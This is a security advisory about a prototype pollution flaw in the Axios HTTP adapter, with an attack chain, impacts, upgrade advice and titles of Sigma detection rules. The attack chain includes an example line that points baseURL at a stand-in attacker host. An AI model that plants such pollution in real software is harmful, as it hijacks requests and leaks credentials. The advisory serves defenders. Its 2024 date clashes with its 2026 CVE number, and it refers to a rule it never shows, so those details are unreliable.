---
title: Axios HTTP Adapter Prototype Pollution Vulnerability
slug: 2024-01-axios-prototype-pollution
description: The Axios HTTP adapter is vulnerable to prototype pollution due to missing `hasOwnProperty` guards on several config properties, allowing attackers to inject arbitrary headers, redirect requests, and execute code.
date: "2024-01-03T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - prototype-pollution
  - javascript
  - axios
  - vulnerability
  - request-hijacking
vendors:
  - npm
products:
  - axios (>= 1.0.0, < 1.15.2)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
references:
  - https://github.com/advisories/GHSA-q8qp-cvcw-x6jj
rules:
  - title: Detect Prototype Pollution via Object.prototype Modification
    description: Detects modifications to the Object.prototype, which is a common technique used in prototype pollution attacks.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - process_creation
      - windows
  - title: Detect Axios Request to Suspicious BaseURL (Prototype Pollution)
    description: Detects network connections to domains set via prototype pollution of baseURL when using Axios.
    platform: sigma
    severity: medium
    tactics:
      - command_and_control
    techniques:
      - T1071.001
    data_sources:
      - network_connection
      - windows
rules_count: 2
---

The Axios HTTP adapter, a popular JavaScript library for making HTTP requests, is vulnerable to prototype pollution (CVE-2026-42264) in versions 1.0.0 through 1.15.1. Specifically, five config properties (`config.auth`, `config.baseURL`, `config.socketPath`, `config.beforeRedirect`, and `config.insecureHTTPParser`) are read without proper `hasOwnProperty` checks, making them susceptible to manipulation via prototype pollution. When `Object.prototype` is polluted by another dependency in the same process, Axios silently picks up these polluted values on every outbound HTTP request. This vulnerability enables attackers to inject arbitrary headers, redirect requests to attacker-controlled servers, redirect requests to internal Unix sockets, execute attacker-supplied callbacks during HTTP redirects, and enable the Node.js insecure HTTP parser on all requests.

## Attack Chain

1.  Attacker identifies a vulnerable Axios version (>= 1.0.0, < 1.15.2) within a Node.js application.
2.  Attacker injects a malicious dependency or leverages an existing dependency with a prototype pollution vulnerability.
3.  The malicious dependency pollutes the `Object.prototype` with attacker-controlled values for properties such as `auth`, `baseURL`, `socketPath`, `beforeRedirect`, or `insecureHTTPParser`. For example, `Object.prototype.baseURL = 'https://evil.com'`.
4.  The application initiates an HTTP request using Axios, for example, `axios.get('/api/users')`.
5.  Axios reads the polluted `Object.prototype.baseURL` due to the missing `hasOwnProperty` check when resolving the request configuration.
6.  The request is redirected to the attacker-controlled server specified in the polluted `baseURL` (e.g., `https://evil.com/api/users`).
7.  The attacker captures the request and any sensitive information included.
8.  Depending on the polluted property, the attacker can achieve credential injection, request hijacking, SSRF, code execution, or parser weakening.

## Impact

Successful exploitation of this prototype pollution vulnerability can lead to several critical impacts. Credential injection can expose sensitive authentication data, potentially compromising user accounts and internal systems. Request hijacking allows attackers to intercept and modify data in transit. Server-Side Request Forgery (SSRF) enables attackers to access internal resources and potentially execute arbitrary code on the server. Code execution during HTTP redirects grants attackers control over the application's execution flow. Enabling the insecure HTTP parser can facilitate request smuggling attacks, leading to further compromise. While the number of affected applications is unknown, the widespread use of Axios makes this a high-impact vulnerability.

## Recommendation

*   Upgrade to Axios version 1.15.2 or later to patch CVE-2026-42264.
*   Implement input validation and sanitization to prevent prototype pollution vulnerabilities in other dependencies.
*   Deploy the following Sigma rule to detect attempts to exploit this vulnerability by monitoring for modifications to `Object.prototype`.
*   Review and audit dependencies for known prototype pollution vulnerabilities using tools like `npm audit`.
